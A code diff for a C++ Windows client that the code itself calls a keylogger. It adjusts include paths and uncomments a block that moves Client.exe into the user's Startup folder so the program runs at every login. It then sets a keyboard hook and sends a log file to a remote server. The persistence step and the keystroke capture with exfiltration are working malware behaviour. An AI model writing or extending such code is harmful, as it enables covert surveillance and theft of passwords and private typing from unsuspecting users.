@@ -1,5 +1,5 @@
-#include "Communication.h"
-#include "KeyboardHook.h"
+#include "Communication/Communication.h"
+#include "Hook/KeyboardHook.h"
 #include <filesystem>
 #include <thread>
 
@@ -21,14 +21,14 @@ void communication_with_server(std::string log){
 			Communicate_with_server(connection_socket, log);
 
 			mtx.unlock();
-		}
 
+		}
 	}
 }
 
 int main(){
 
-	//This variable defines the logFile name
+//This variable defines the logFile name
 std::string log = "logFile.txt";
 
 //This variable defines if the terminal is displayed while the keylogger is running
@@ -44,12 +44,12 @@ bool display_terminal = true;
 		exit(EXIT_FAILURE);
 	}
 
-	/*fs::path startup = "C:/Users/" + std::string(std::getenv("USERNAME")) + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/";
+	fs::path startup = "C:/Users/" + std::string(std::getenv("USERNAME")) + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/";
 
 	if(!fs::equivalent(startup, fs::current_path())){
 		startup += "Client.exe";
 		rename("Client.exe", startup);
-	}*/
+	}
 
     SetHook(log);
 
